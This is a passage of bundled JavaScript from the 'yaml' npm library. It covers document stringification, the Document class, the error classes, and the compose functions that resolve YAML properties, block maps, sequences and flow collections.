      if ((body[0] === "|" || body[0] === ">") && lines[lines.length - 1] === "---") {
        lines[lines.length - 1] = `--- ${body}`;
      } else
        lines.push(body);
    } else {
      lines.push(stringify.stringify(doc2.contents, ctx));
    }
    if (doc2.directives?.docEnd) {
      if (doc2.comment) {
        const cs = commentString(doc2.comment);
        if (cs.includes(`
`)) {
          lines.push("...");
          lines.push(stringifyComment.indentComment(cs, ""));
        } else {
          lines.push(`... ${cs}`);
        }
      } else {
        lines.push("...");
      }
    } else {
      let dc = doc2.comment;
      if (dc && chompKeep)
        dc = dc.replace(/^\n+/, "");
      if (dc) {
        if ((!chompKeep || contentComment) && lines[lines.length - 1] !== "")
          lines.push("");
        lines.push(stringifyComment.indentComment(commentString(dc), ""));
      }
    }
    return lines.join(`
`) + `
`;
  }
  exports.stringifyDocument = stringifyDocument;
});

// node_modules/yaml/dist/doc/Document.js
var require_Document = __commonJS((exports) => {
  var Alias = require_Alias();
  var Collection = require_Collection();
  var identity = require_identity();
  var Pair = require_Pair();
  var toJS = require_toJS();
  var Schema = require_Schema();
  var stringifyDocument = require_stringifyDocument();
  var anchors = require_anchors();
  var applyReviver = require_applyReviver();
  var createNode = require_createNode();
  var directives = require_directives();

  class Document {
    constructor(value, replacer, options) {
      this.commentBefore = null;
      this.comment = null;
      this.errors = [];
      this.warnings = [];
      Object.defineProperty(this, identity.NODE_TYPE, { value: identity.DOC });
      let _replacer = null;
      if (typeof replacer === "function" || Array.isArray(replacer)) {
        _replacer = replacer;
      } else if (options === undefined && replacer) {
        options = replacer;
        replacer = undefined;
      }
      const opt = Object.assign({
        intAsBigInt: false,
        keepSourceTokens: false,
        logLevel: "warn",
        prettyErrors: true,
        strict: true,
        stringKeys: false,
        uniqueKeys: true,
        version: "1.2"
      }, options);
      this.options = opt;
      let { version: version2 } = opt;
      if (options?._directives) {
        this.directives = options._directives.atDocument();
        if (this.directives.yaml.explicit)
          version2 = this.directives.yaml.version;
      } else
        this.directives = new directives.Directives({ version: version2 });
      this.setSchema(version2, options);
      this.contents = value === undefined ? null : this.createNode(value, _replacer, options);
    }
    clone() {
      const copy = Object.create(Document.prototype, {
        [identity.NODE_TYPE]: { value: identity.DOC }
      });
      copy.commentBefore = this.commentBefore;
      copy.comment = this.comment;
      copy.errors = this.errors.slice();
      copy.warnings = this.warnings.slice();
      copy.options = Object.assign({}, this.options);
      if (this.directives)
        copy.directives = this.directives.clone();
      copy.schema = this.schema.clone();
      copy.contents = identity.isNode(this.contents) ? this.contents.clone(copy.schema) : this.contents;
      if (this.range)
        copy.range = this.range.slice();
      return copy;
    }
    add(value) {
      if (assertCollection(this.contents))
        this.contents.add(value);
    }
    addIn(path, value) {
      if (assertCollection(this.contents))
        this.contents.addIn(path, value);
    }
    createAlias(node, name) {
      if (!node.anchor) {
        const prev = anchors.anchorNames(this);
        node.anchor = !name || prev.has(name) ? anchors.findNewAnchor(name || "a", prev) : name;
      }
      return new Alias.Alias(node.anchor);
    }
    createNode(value, replacer, options) {
      let _replacer = undefined;
      if (typeof replacer === "function") {
        value = replacer.call({ "": value }, "", value);
        _replacer = replacer;
      } else if (Array.isArray(replacer)) {
        const keyToStr = (v) => typeof v === "number" || v instanceof String || v instanceof Number;
        const asStr = replacer.filter(keyToStr).map(String);
        if (asStr.length > 0)
          replacer = replacer.concat(asStr);
        _replacer = replacer;
      } else if (options === undefined && replacer) {
        options = replacer;
        replacer = undefined;
      }
      const { aliasDuplicateObjects, anchorPrefix, flow, keepUndefined, onTagObj, tag } = options ?? {};
      const { onAnchor, setAnchors, sourceObjects } = anchors.createNodeAnchors(this, anchorPrefix || "a");
      const ctx = {
        aliasDuplicateObjects: aliasDuplicateObjects ?? true,
        keepUndefined: keepUndefined ?? false,
        onAnchor,
        onTagObj,
        replacer: _replacer,
        schema: this.schema,
        sourceObjects
      };
      const node = createNode.createNode(value, tag, ctx);
      if (flow && identity.isCollection(node))
        node.flow = true;
      setAnchors();
      return node;
    }
    createPair(key, value, options = {}) {
      const k = this.createNode(key, null, options);
      const v = this.createNode(value, null, options);
      return new Pair.Pair(k, v);
    }
    delete(key) {
      return assertCollection(this.contents) ? this.contents.delete(key) : false;
    }
    deleteIn(path) {
      if (Collection.isEmptyPath(path)) {
        if (this.contents == null)
          return false;
        this.contents = null;
        return true;
      }
      return assertCollection(this.contents) ? this.contents.deleteIn(path) : false;
    }
    get(key, keepScalar) {
      return identity.isCollection(this.contents) ? this.contents.get(key, keepScalar) : undefined;
    }
    getIn(path, keepScalar) {
      if (Collection.isEmptyPath(path))
        return !keepScalar && identity.isScalar(this.contents) ? this.contents.value : this.contents;
      return identity.isCollection(this.contents) ? this.contents.getIn(path, keepScalar) : undefined;
    }
    has(key) {
      return identity.isCollection(this.contents) ? this.contents.has(key) : false;
    }
    hasIn(path) {
      if (Collection.isEmptyPath(path))
        return this.contents !== undefined;
      return identity.isCollection(this.contents) ? this.contents.hasIn(path) : false;
    }
    set(key, value) {
      if (this.contents == null) {
        this.contents = Collection.collectionFromPath(this.schema, [key], value);
      } else if (assertCollection(this.contents)) {
        this.contents.set(key, value);
      }
    }
    setIn(path, value) {
      if (Collection.isEmptyPath(path)) {
        this.contents = value;
      } else if (this.contents == null) {
        this.contents = Collection.collectionFromPath(this.schema, Array.from(path), value);
      } else if (assertCollection(this.contents)) {
        this.contents.setIn(path, value);
      }
    }
    setSchema(version2, options = {}) {
      if (typeof version2 === "number")
        version2 = String(version2);
      let opt;
      switch (version2) {
        case "1.1":
          if (this.directives)
            this.directives.yaml.version = "1.1";
          else
            this.directives = new directives.Directives({ version: "1.1" });
          opt = { resolveKnownTags: false, schema: "yaml-1.1" };
          break;
        case "1.2":
        case "next":
          if (this.directives)
            this.directives.yaml.version = version2;
          else
            this.directives = new directives.Directives({ version: version2 });
          opt = { resolveKnownTags: true, schema: "core" };
          break;
        case null:
          if (this.directives)
            delete this.directives;
          opt = null;
          break;
        default: {
          const sv = JSON.stringify(version2);
          throw new Error(`Expected '1.1', '1.2' or null as first argument, but found: ${sv}`);
        }
      }
      if (options.schema instanceof Object)
        this.schema = options.schema;
      else if (opt)
        this.schema = new Schema.Schema(Object.assign(opt, options));
      else
        throw new Error(`With a null YAML version, the { schema: Schema } option is required`);
    }
    toJS({ json: json2, jsonArg, mapAsMap, maxAliasCount, onAnchor, reviver } = {}) {
      const ctx = {
        anchors: new Map,
        doc: this,
        keep: !json2,
        mapAsMap: mapAsMap === true,
        mapKeyWarned: false,
        maxAliasCount: typeof maxAliasCount === "number" ? maxAliasCount : 100
      };
      const res = toJS.toJS(this.contents, jsonArg ?? "", ctx);
      if (typeof onAnchor === "function")
        for (const { count, res: res2 } of ctx.anchors.values())
          onAnchor(res2, count);
      return typeof reviver === "function" ? applyReviver.applyReviver(reviver, { "": res }, "", res) : res;
    }
    toJSON(jsonArg, onAnchor) {
      return this.toJS({ json: true, jsonArg, mapAsMap: false, onAnchor });
    }
    toString(options = {}) {
      if (this.errors.length > 0)
        throw new Error("Document with errors cannot be stringified");
      if ("indent" in options && (!Number.isInteger(options.indent) || Number(options.indent) <= 0)) {
        const s = JSON.stringify(options.indent);
        throw new Error(`"indent" option must be a positive integer, not ${s}`);
      }
      return stringifyDocument.stringifyDocument(this, options);
    }
  }
  function assertCollection(contents) {
    if (identity.isCollection(contents))
      return true;
    throw new Error("Expected a YAML collection as document contents");
  }
  exports.Document = Document;
});

// node_modules/yaml/dist/errors.js
var require_errors = __commonJS((exports) => {
  class YAMLError extends Error {
    constructor(name, pos, code, message) {
      super();
      this.name = name;
      this.code = code;
      this.message = message;
      this.pos = pos;
    }
  }

  class YAMLParseError extends YAMLError {
    constructor(pos, code, message) {
      super("YAMLParseError", pos, code, message);
    }
  }

  class YAMLWarning extends YAMLError {
    constructor(pos, code, message) {
      super("YAMLWarning", pos, code, message);
    }
  }
  var prettifyError2 = (src, lc) => (error48) => {
    if (error48.pos[0] === -1)
      return;
    error48.linePos = error48.pos.map((pos) => lc.linePos(pos));
    const { line, col } = error48.linePos[0];
    error48.message += ` at line ${line}, column ${col}`;
    let ci = col - 1;
    let lineStr = src.substring(lc.lineStarts[line - 1], lc.lineStarts[line]).replace(/[\n\r]+$/, "");
    if (ci >= 60 && lineStr.length > 80) {
      const trimStart = Math.min(ci - 39, lineStr.length - 79);
      lineStr = "\u2026" + lineStr.substring(trimStart);
      ci -= trimStart - 1;
    }
    if (lineStr.length > 80)
      lineStr = lineStr.substring(0, 79) + "\u2026";
    if (line > 1 && /^ *$/.test(lineStr.substring(0, ci))) {
      let prev = src.substring(lc.lineStarts[line - 2], lc.lineStarts[line - 1]);
      if (prev.length > 80)
        prev = prev.substring(0, 79) + `\u2026
`;
      lineStr = prev + lineStr;
    }
    if (/[^ ]/.test(lineStr)) {
      let count = 1;
      const end = error48.linePos[1];
      if (end?.line === line && end.col > col) {
        count = Math.max(1, Math.min(end.col - col, 80 - ci));
      }
      const pointer = " ".repeat(ci) + "^".repeat(count);
      error48.message += `:

${lineStr}
${pointer}
`;
    }
  };
  exports.YAMLError = YAMLError;
  exports.YAMLParseError = YAMLParseError;
  exports.YAMLWarning = YAMLWarning;
  exports.prettifyError = prettifyError2;
});

// node_modules/yaml/dist/compose/resolve-props.js
var require_resolve_props = __commonJS((exports) => {
  function resolveProps(tokens, { flow, indicator, next, offset, onError, parentIndent, startOnNewline }) {
    let spaceBefore = false;
    let atNewline = startOnNewline;
    let hasSpace = startOnNewline;
    let comment = "";
    let commentSep = "";
    let hasNewline = false;
    let reqSpace = false;
    let tab = null;
    let anchor = null;
    let tag = null;
    let newlineAfterProp = null;
    let comma = null;
    let found = null;
    let start = null;
    for (const token of tokens) {
      if (reqSpace) {
        if (token.type !== "space" && token.type !== "newline" && token.type !== "comma")
          onError(token.offset, "MISSING_CHAR", "Tags and anchors must be separated from the next token by white space");
        reqSpace = false;
      }
      if (tab) {
        if (atNewline && token.type !== "comment" && token.type !== "newline") {
          onError(tab, "TAB_AS_INDENT", "Tabs are not allowed as indentation");
        }
        tab = null;
      }
      switch (token.type) {
        case "space":
          if (!flow && (indicator !== "doc-start" || next?.type !== "flow-collection") && token.source.includes("\t")) {
            tab = token;
          }
          hasSpace = true;
          break;
        case "comment": {
          if (!hasSpace)
            onError(token, "MISSING_CHAR", "Comments must be separated from other tokens by white space characters");
          const cb = token.source.substring(1) || " ";
          if (!comment)
            comment = cb;
          else
            comment += commentSep + cb;
          commentSep = "";
          atNewline = false;
          break;
        }
        case "newline":
          if (atNewline) {
            if (comment)
              comment += token.source;
            else if (!found || indicator !== "seq-item-ind")
              spaceBefore = true;
          } else
            commentSep += token.source;
          atNewline = true;
          hasNewline = true;
          if (anchor || tag)
            newlineAfterProp = token;
          hasSpace = true;
          break;
        case "anchor":
          if (anchor)
            onError(token, "MULTIPLE_ANCHORS", "A node can have at most one anchor");
          if (token.source.endsWith(":"))
            onError(token.offset + token.source.length - 1, "BAD_ALIAS", "Anchor ending in : is ambiguous", true);
          anchor = token;
          start ?? (start = token.offset);
          atNewline = false;
          hasSpace = false;
          reqSpace = true;
          break;
        case "tag": {
          if (tag)
            onError(token, "MULTIPLE_TAGS", "A node can have at most one tag");
          tag = token;
          start ?? (start = token.offset);
          atNewline = false;
          hasSpace = false;
          reqSpace = true;
          break;
        }
        case indicator:
          if (anchor || tag)
            onError(token, "BAD_PROP_ORDER", `Anchors and tags must be after the ${token.source} indicator`);
          if (found)
            onError(token, "UNEXPECTED_TOKEN", `Unexpected ${token.source} in ${flow ?? "collection"}`);
          found = token;
          atNewline = indicator === "seq-item-ind" || indicator === "explicit-key-ind";
          hasSpace = false;
          break;
        case "comma":
          if (flow) {
            if (comma)
              onError(token, "UNEXPECTED_TOKEN", `Unexpected , in ${flow}`);
            comma = token;
            atNewline = false;
            hasSpace = false;
            break;
          }
        default:
          onError(token, "UNEXPECTED_TOKEN", `Unexpected ${token.type} token`);
          atNewline = false;
          hasSpace = false;
      }
    }
    const last = tokens[tokens.length - 1];
    const end = last ? last.offset + last.source.length : offset;
    if (reqSpace && next && next.type !== "space" && next.type !== "newline" && next.type !== "comma" && (next.type !== "scalar" || next.source !== "")) {
      onError(next.offset, "MISSING_CHAR", "Tags and anchors must be separated from the next token by white space");
    }
    if (tab && (atNewline && tab.indent <= parentIndent || next?.type === "block-map" || next?.type === "block-seq"))
      onError(tab, "TAB_AS_INDENT", "Tabs are not allowed as indentation");
    return {
      comma,
      found,
      spaceBefore,
      comment,
      hasNewline,
      anchor,
      tag,
      newlineAfterProp,
      end,
      start: start ?? end
    };
  }
  exports.resolveProps = resolveProps;
});

// node_modules/yaml/dist/compose/util-contains-newline.js
var require_util_contains_newline = __commonJS((exports) => {
  function containsNewline(key) {
    if (!key)
      return null;
    switch (key.type) {
      case "alias":
      case "scalar":
      case "double-quoted-scalar":
      case "single-quoted-scalar":
        if (key.source.includes(`
`))
          return true;
        if (key.end) {
          for (const st of key.end)
            if (st.type === "newline")
              return true;
        }
        return false;
      case "flow-collection":
        for (const it of key.items) {
          for (const st of it.start)
            if (st.type === "newline")
              return true;
          if (it.sep) {
            for (const st of it.sep)
              if (st.type === "newline")
                return true;
          }
          if (containsNewline(it.key) || containsNewline(it.value))
            return true;
        }
        return false;
      default:
        return true;
    }
  }
  exports.containsNewline = containsNewline;
});

// node_modules/yaml/dist/compose/util-flow-indent-check.js
var require_util_flow_indent_check = __commonJS((exports) => {
  var utilContainsNewline = require_util_contains_newline();
  function flowIndentCheck(indent, fc, onError) {
    if (fc?.type === "flow-collection") {
      const end = fc.end[0];
      if (end.indent === indent && (end.source === "]" || end.source === "}") && utilContainsNewline.containsNewline(fc)) {
        const msg = "Flow end indicator should be more indented than parent";
        onError(end, "BAD_INDENT", msg, true);
      }
    }
  }
  exports.flowIndentCheck = flowIndentCheck;
});

// node_modules/yaml/dist/compose/util-map-includes.js
var require_util_map_includes = __commonJS((exports) => {
  var identity = require_identity();
  function mapIncludes(ctx, items, search) {
    const { uniqueKeys } = ctx.options;
    if (uniqueKeys === false)
      return false;
    const isEqual = typeof uniqueKeys === "function" ? uniqueKeys : (a, b) => a === b || identity.isScalar(a) && identity.isScalar(b) && a.value === b.value;
    return items.some((pair) => isEqual(pair.key, search));
  }
  exports.mapIncludes = mapIncludes;
});

// node_modules/yaml/dist/compose/resolve-block-map.js
var require_resolve_block_map = __commonJS((exports) => {
  var Pair = require_Pair();
  var YAMLMap = require_YAMLMap();
  var resolveProps = require_resolve_props();
  var utilContainsNewline = require_util_contains_newline();
  var utilFlowIndentCheck = require_util_flow_indent_check();
  var utilMapIncludes = require_util_map_includes();
  var startColMsg = "All mapping items must start at the same column";
  function resolveBlockMap({ composeNode, composeEmptyNode }, ctx, bm, onError, tag) {
    const NodeClass = tag?.nodeClass ?? YAMLMap.YAMLMap;
    const map2 = new NodeClass(ctx.schema);
    if (ctx.atRoot)
      ctx.atRoot = false;
    let offset = bm.offset;
    let commentEnd = null;
    for (const collItem of bm.items) {
      const { start, key, sep, value } = collItem;
      const keyProps = resolveProps.resolveProps(start, {
        indicator: "explicit-key-ind",
        next: key ?? sep?.[0],
        offset,
        onError,
        parentIndent: bm.indent,
        startOnNewline: true
      });
      const implicitKey = !keyProps.found;
      if (implicitKey) {
        if (key) {
          if (key.type === "block-seq")
            onError(offset, "BLOCK_AS_IMPLICIT_KEY", "A block sequence may not be used as an implicit map key");
          else if ("indent" in key && key.indent !== bm.indent)
            onError(offset, "BAD_INDENT", startColMsg);
        }
        if (!keyProps.anchor && !keyProps.tag && !sep) {
          commentEnd = keyProps.end;
          if (keyProps.comment) {
            if (map2.comment)
              map2.comment += `
` + keyProps.comment;
            else
              map2.comment = keyProps.comment;
          }
          continue;
        }
        if (keyProps.newlineAfterProp || utilContainsNewline.containsNewline(key)) {
          onError(key ?? start[start.length - 1], "MULTILINE_IMPLICIT_KEY", "Implicit keys need to be on a single line");
        }
      } else if (keyProps.found?.indent !== bm.indent) {
        onError(offset, "BAD_INDENT", startColMsg);
      }
      ctx.atKey = true;
      const keyStart = keyProps.end;
      const keyNode = key ? composeNode(ctx, key, keyProps, onError) : composeEmptyNode(ctx, keyStart, start, null, keyProps, onError);
      if (ctx.schema.compat)
        utilFlowIndentCheck.flowIndentCheck(bm.indent, key, onError);
      ctx.atKey = false;
      if (utilMapIncludes.mapIncludes(ctx, map2.items, keyNode))
        onError(keyStart, "DUPLICATE_KEY", "Map keys must be unique");
      const valueProps = resolveProps.resolveProps(sep ?? [], {
        indicator: "map-value-ind",
        next: value,
        offset: keyNode.range[2],
        onError,
        parentIndent: bm.indent,
        startOnNewline: !key || key.type === "block-scalar"
      });
      offset = valueProps.end;
      if (valueProps.found) {
        if (implicitKey) {
          if (value?.type === "block-map" && !valueProps.hasNewline)
            onError(offset, "BLOCK_AS_IMPLICIT_KEY", "Nested mappings are not allowed in compact mappings");
          if (ctx.options.strict && keyProps.start < valueProps.found.offset - 1024)
            onError(keyNode.range, "KEY_OVER_1024_CHARS", "The : indicator must be at most 1024 chars after the start of an implicit block mapping key");
        }
        const valueNode = value ? composeNode(ctx, value, valueProps, onError) : composeEmptyNode(ctx, offset, sep, null, valueProps, onError);
        if (ctx.schema.compat)
          utilFlowIndentCheck.flowIndentCheck(bm.indent, value, onError);
        offset = valueNode.range[2];
        const pair = new Pair.Pair(keyNode, valueNode);
        if (ctx.options.keepSourceTokens)
          pair.srcToken = collItem;
        map2.items.push(pair);
      } else {
        if (implicitKey)
          onError(keyNode.range, "MISSING_CHAR", "Implicit map keys need to be followed by map values");
        if (valueProps.comment) {
          if (keyNode.comment)
            keyNode.comment += `
` + valueProps.comment;
          else
            keyNode.comment = valueProps.comment;
        }
        const pair = new Pair.Pair(keyNode);
        if (ctx.options.keepSourceTokens)
          pair.srcToken = collItem;
        map2.items.push(pair);
      }
    }
    if (commentEnd && commentEnd < offset)
      onError(commentEnd, "IMPOSSIBLE", "Map comment with trailing content");
    map2.range = [bm.offset, offset, commentEnd ?? offset];
    return map2;
  }
  exports.resolveBlockMap = resolveBlockMap;
});

// node_modules/yaml/dist/compose/resolve-block-seq.js
var require_resolve_block_seq = __commonJS((exports) => {
  var YAMLSeq = require_YAMLSeq();
  var resolveProps = require_resolve_props();
  var utilFlowIndentCheck = require_util_flow_indent_check();
  function resolveBlockSeq({ composeNode, composeEmptyNode }, ctx, bs, onError, tag) {
    const NodeClass = tag?.nodeClass ?? YAMLSeq.YAMLSeq;
    const seq = new NodeClass(ctx.schema);
    if (ctx.atRoot)
      ctx.atRoot = false;
    if (ctx.atKey)
      ctx.atKey = false;
    let offset = bs.offset;
    let commentEnd = null;
    for (const { start, value } of bs.items) {
      const props = resolveProps.resolveProps(start, {
        indicator: "seq-item-ind",
        next: value,
        offset,
        onError,
        parentIndent: bs.indent,
        startOnNewline: true
      });
      if (!props.found) {
        if (props.anchor || props.tag || value) {
          if (value?.type === "block-seq")
            onError(props.end, "BAD_INDENT", "All sequence items must start at the same column");
          else
            onError(offset, "MISSING_CHAR", "Sequence item without - indicator");
        } else {
          commentEnd = props.end;
          if (props.comment)
            seq.comment = props.comment;
          continue;
        }
      }
      const node = value ? composeNode(ctx, value, props, onError) : composeEmptyNode(ctx, props.end, start, null, props, onError);
      if (ctx.schema.compat)
        utilFlowIndentCheck.flowIndentCheck(bs.indent, value, onError);
      offset = node.range[2];
      seq.items.push(node);
    }
    seq.range = [bs.offset, offset, commentEnd ?? offset];
    return seq;
  }
  exports.resolveBlockSeq = resolveBlockSeq;
});

// node_modules/yaml/dist/compose/resolve-end.js
var require_resolve_end = __commonJS((exports) => {
  function resolveEnd(end, offset, reqSpace, onError) {
    let comment = "";
    if (end) {
      let hasSpace = false;
      let sep = "";
      for (const token of end) {
        const { source, type } = token;
        switch (type) {
          case "space":
            hasSpace = true;
            break;
          case "comment": {
            if (reqSpace && !hasSpace)
              onError(token, "MISSING_CHAR", "Comments must be separated from other tokens by white space characters");
            const cb = source.substring(1) || " ";
            if (!comment)
              comment = cb;
            else
              comment += sep + cb;
            sep = "";
            break;
          }
          case "newline":
            if (comment)
              sep += source;
            hasSpace = true;
            break;
          default:
            onError(token, "UNEXPECTED_TOKEN", `Unexpected ${type} at node end`);
        }
        offset += source.length;
      }
    }
    return { comment, offset };
  }
  exports.resolveEnd = resolveEnd;
});

// node_modules/yaml/dist/compose/resolve-flow-collection.js
var require_resolve_flow_collection = __commonJS((exports) => {
  var identity = require_identity();
  var Pair = require_Pair();
  var YAMLMap = require_YAMLMap();
  var YAMLSeq = require_YAMLSeq();
  var resolveEnd = require_resolve_end();
  var resolveProps = require_resolve_props();
  var utilContainsNewline = require_util_contains_newline();
  var utilMapIncludes = require_util_map_includes();
  var blockMsg = "Block collections are not allowed within flow collections";
  var isBlock = (token) => token && (token.type === "block-map" || token.type === "block-seq");
  function resolveFlowCollection({ composeNode, composeEmptyNode }, ctx, fc, onError, tag) {
    const isMap = fc.start.source === "{";
    const fcName = isMap ? "flow map" : "flow sequence";
    const NodeClass = tag?.nodeClass ?? (isMap ? YAMLMap.YAMLMap : YAMLSeq.YAMLSeq);
    const coll = new NodeClass(ctx.schema);
    coll.flow = true;
    const atRoot = ctx.atRoot;
    if (atRoot)
      ctx.atRoot = false;
    if (ctx.atKey)
      ctx.atKey = false;
    let offset = fc.offset + fc.start.source.length;
    for (let i = 0;i < fc.items.length; ++i) {
      const collItem = fc.items[i];
      const { start, key, sep, value } = collItem;
      const props = resolveProps.resolveProps(start, {
        flow: fcName,
        indicator: "explicit-key-ind",
        next: key ?? sep?.[0],
        offset,
        onError,
        parentIndent: fc.indent,
        startOnNewline: false
      });
      if (!props.found) {
        if (!props.anchor && !props.tag && !sep && !value) {
          if (i === 0 && props.comma)
            onError(props.comma, "UNEXPECTED_TOKEN", `Unexpected , in ${fcName}`);
          else if (i < fc.items.length - 1)
            onError(props.start, "UNEXPECTED_TOKEN", `Unexpected empty item in ${fcName}`);
          if (props.comment) {
            if (coll.comment)
              coll.comment += `
` + props.comment;
            else
              coll.comment = props.comment;
          }
          offset = props.end;
          continue;
        }
        if (!isMap && ctx.options.strict && utilContainsNewline.containsNewline(key))
          onError(key, "MULTILINE_IMPLICIT_KEY", "Implicit keys of flow sequence pairs need to be on a single line");
      }
      if (i === 0) {
        if (props.comma)
          onError(props.comma, "UNEXPECTED_TOKEN", `Unexpected , in ${fcName}`);
      } else {
        if (!props.comma)
          onError(props.start, "MISSING_CHAR", `Missing , between ${fcName} items`);
        if (props.comment) {
          let prevItemComment = "";
          loop:
            for (const st of start) {
              switch (st.type) {
                case "comma":
                case "space":
                  break;
                case "comment":
                  prevItemComment = st.source.substring(1);
                  break loop;
                default:
                  break loop;
              }
            }
          if (prevItemComment) {
            let prev = coll.items[coll.items.length - 1];
            if (identity.isPair(prev))
              prev = prev.value ?? prev.key;
            if (prev.comment)
              prev.comment += `
` + prevItemComment;
            else
              prev.comment = prevItemComment;
            props.comment = props.comment.substring(prevItemComment.length + 1);
          }
        }
      }
      if (!isMap && !sep && !props.found) {
        const valueNode = value ? composeNode(ctx, value, props, onError) : composeEmptyNode(ctx, props.end, sep, null, props, onError);
        coll.items.push(valueNode);
        offset = valueNode.range[2];
        if (isBlock(value))
          onError(valueNode.range, "BLOCK_IN_FLOW", blockMsg);
      } else {
        ctx.atKey = true;
        const keyStart = props.end;
        const keyNode = key ? composeNode(ctx, key, props, onError) : composeEmptyNode(ctx, keyStart, start, null, props, onError);
        if (isBlock(key))
          onError(keyNode.range, "BLOCK_IN_FLOW", blockMsg);
        ctx.atKey = false;
        const valueProps = resolveProps.resolveProps(sep ?? [], {
          flow: fcName,
          indicator: "map-value-ind",
          next: value,
          offset: keyNode.range[2],
          onError,
          parentIndent: fc.indent,
          startOnNewline: false
        });
        if (valueProps.found) {
          if (!isMap && !props.found && ctx.options.strict) {
            if (sep)
              for (const st of sep) {
                if (st === valueProps.found)
                  break;
                if (st.type === "newline") {
                  onError(st, "MULTILINE_IMPLICIT_KEY", "Implicit keys of flow sequence pairs need to be on a single line");
                  break;
                }
              }
            if (props.start < valueProps.found.offset - 1024)
              onError(valueProps.found, "KEY_OVER_1024_CHARS", "The : indicator must be at most 1024 chars after the start of an implicit flow sequence key");
          }
        } else if (value) {
          if ("source" in value && value.source?.[0] === ":")
            onError(value, "MISSING_CHAR", `Missing space after : in ${fcName}`);
          else
            onError(valueProps.start, "MISSING_CHAR", `Missing , or : between ${fcName} items`);
        }
        const valueNode = value ? composeNode(ctx, value, valueProps, onError) : valueProps.found ? composeEmptyNode(ctx, valueProps.end, sep, null, valueProps, onError) : null;
        if (valueNode) {
          if (isBlock(value))
            onError(valueNode.range, "BLOCK_IN_FLOW", blockMsg);
        } else if (valueProps.comment) {
          if (keyNode.comment)
            keyNode.comment += `
` + valueProps.comment;
          else
            keyNode.comment = valueProps.comment;
        }
        const pair = new Pair.Pair(keyNode, valueNode);
        if (ctx.options.keepSourceTokens)
          pair.srcToken = collItem;
        if (isMap) {
          const map2 = coll;
          if (utilMapIncludes.mapIncludes(ctx, map2.items, keyNode))
            onError(keyStart, "DUPLICATE_KEY", "Map keys must be unique");
          map2.items.push(pair);
        } else {
          const map2 = new YAMLMap.YAMLMap(ctx.schema);
          map2.flow = true;
          map2.items.push(pair);
          const endRange = (valueNode ?? keyNode).range;
          map2.range = [keyNode.range[0], endRange[1], endRange[2]];
          coll.items.push(map2);
        }
        offset = valueNode ? valueNode.range[2] : valueProps.end;
      }
    }
    const expectedEnd = isMap ? "}" : "]";
    const [ce, ...ee] = fc.end;
    let cePos = offset;
    if (ce?.source === expectedEnd)
      cePos = ce.offset + ce.source.length;
    else {
      const name = fcName[0].toUpperCase() + fcName.substring(1);
      const msg = atRoot ? `${name} must end with a ${expectedEnd}` : `${name} in block collection must be sufficiently indented and end with a ${expectedEnd}`;
      onError(offset, atRoot ? "MISSING_CHAR" : "BAD_INDENT", msg);
      if (ce && ce.source.length !== 1)
        ee.unshift(ce);
    }
    if (ee.length > 0) {
      const end = resolveEnd.resolveEnd(ee, cePos, ctx.options.strict, onError);
      if (end.comment) {
        if (coll.comment)
          coll.comment += `
` + end.comment;
        else
          coll.comment = end.comment;
      }
      coll.range = [fc.offset, cePos, end.offset];
    } else {
      coll.range = [fc.offset, cePos, cePos];
    }
    return coll;
  }
  exports.resolveFlowCollection = resolveFlowCollection;
});

// node_modules/yaml/dist/compose/compose-collection.js
var require_compose_collection = __commonJS((exports) => {
  var identity = require_identity();
  var Scalar = require_Scalar();
  var YAMLMap = require_YAMLMap();
  var YAMLSeq = require_YAMLSeq();
  var resolveBlockMap = require_resolve_block_map();
  var resolveBlockSeq = require_resolve_block_seq();
  var resolveFlowCollection = require_resolve_flow_collection();
  function resolveCollection(CN, ctx, token, onError, tagName, tag) {
    const coll = token.type === "block-map" ? resolveBlockMap.resolveBlockMap(CN, ctx, token, onError, tag) : token.type === "block-seq" ? resolveBlockSeq.resolveBlockSeq(CN, ctx, token, onError, tag) : resolveFlowCollection.resolveFlowCollection(CN, ctx, token, onError, tag);
    const Coll = coll.constructor;
    if (tagName === "!" || tagName === Coll.tagName) {
      coll.tag = Coll.tagName;
      return coll;
    }
    if (tagName)
      coll.tag = tagName;
    return coll;
  }
  function composeCollection(CN, ctx, token, props, onError) {
    const tagToken = props.tag;
    const tagName = !tagToken ? null : ctx.directives.tagName(tagToken.source, (msg) => onError(tagToken, "TAG_RESOLVE_FAILED", msg));
    if (token.type === "block-seq") {
      const { anchor, newlineAfterProp: nl } = props;
      const lastProp = anchor && tagToken ? anchor.offset > tagToken.offset ? anchor : tagToken : anchor ?? tagToken;
      if (lastProp && (!nl || nl.offset < lastProp.offset)) {
        const message = "Missing newline after block sequence props";
        onError(lastProp, "MISSING_CHAR", message);
      }
    }
    const expType = token.type === "block-map" ? "map" : token.type === "block-seq" ? "seq" : token.start.source === "{" ? "map" : "seq";
    if (!tagToken || !tagName || tagName === "!" || tagName === YAMLMap.YAMLMap.tagName && expType === "map" || tagName === YAMLSeq.YAMLSeq.tagName && expType === "seq") {
      return resolveCollection(CN, ctx, token, onError, tagName);
    }
    let tag = ctx.schema.tags.find((t) => t.tag === tagName && t.collection === expType);
    if (!tag) {
      const kt = ctx.schema.knownTags[tagName];
      if (kt?.collection === expType) {
        ctx.schema.tags.push(Object.assign({}, kt, { default: false }));
        tag = kt;
      } else {
        if (kt) {
          onError(tagToken, "BAD_COLLECTION_TYPE", `${kt.tag} used for ${expType} collection, but expects ${kt.collection ?? "scalar"}`, true);
        } else {
          onError(tagToken, "TAG_RESOLVE_FAILED", `Unresolved tag: ${tagName}`, true);
        }
        return resolveCollection(CN, ctx, token, onError, tagName);
      }
    }
    const coll = resolveCollection(CN, ctx, token, onError, tagName, tag);
    const res = tag.resolve?.(coll, (msg) => onError(tagToken, "TAG_RESOLVE_FAILED", msg), ctx.options) ?? coll;
    const node = identity.isNode(res) ? res : new Scalar.Scalar(res);
    node.range = coll.range;
    node.tag = tagName;
    if (tag?.format)
      node.format = tag.format;
    return node;
  }
  exports.composeCollection = composeCollection;
});

// node_modules/yaml/dist/compose/resolve-block-scalar.js
var require_resolve_block_scalar = __commonJS((exports) => {
  var Scalar = require_Scalar();
  function resolveBlockScalar(ctx, scalar, onError) {
    const start = scalar.offset;
    const header = parseBlockScalarHeader(scalar, ctx.options.strict, onError);
    if (!header)
      return { value: "", type: null, comment: "", range: [start, start, start] };
    const type = header.mode === ">" ? Scalar.Scalar.BLOCK_FOLDED : Scalar.Scalar.BLOCK_LITERAL;
    const lines = scalar.source ? splitLines(scalar.source) : [];
    let chompStart = lines.length;
    for (let i = lines.length - 1;i >= 0; --i) {
      const content = lines[i][1];
      if (content === "" || content === "\r")
        chompStart = i;
      else
        break;
    }
